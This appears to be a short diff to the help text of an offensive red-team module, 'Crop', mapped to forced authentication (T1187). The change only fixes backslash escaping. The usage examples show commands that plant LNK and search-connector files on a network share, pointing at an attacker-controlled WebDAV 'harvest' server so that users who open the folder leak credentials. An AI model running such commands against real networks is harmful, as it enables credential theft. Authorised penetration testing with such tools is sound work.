@@ -107,10 +107,10 @@ Crop is a tool that can create LNK files that initiate a WebDAV connection when 
 Supported LNK types: .lnk, .url, .library-ms, .searchconnect-ms
 
 Drop an LNK file
-crop -targetLocation \\myserver\shared\ -targetFilename Athena.lnk -targetPath \\MyCropServer:8080\harvest -targetIcon \\MyCropServer:8080\harvest\my.ico
+crop -targetLocation \\\\myserver\\shared\\ -targetFilename Athena.lnk -targetPath \\\\MyCropServer:8080\\harvest -targetIcon \\\\MyCropServer:8080\\harvest\\my.ico
 
 Drop a .searchconnect-ms
-crop -targetLocation \\myserver\shared\ -targetFilename Athena.searchconnector-ms -targetPath \\MyCropServer:8080\harvest -recurse """
+crop -targetLocation \\\\myserver\\shared\\ -targetFilename Athena.searchconnector-ms -targetPath \\MyCropServer:8080\\harvest -recurse """
     author = "@domchell, @checkymander"
     argument_class = FarmerArguments
     attackmapping = ["T1187"]
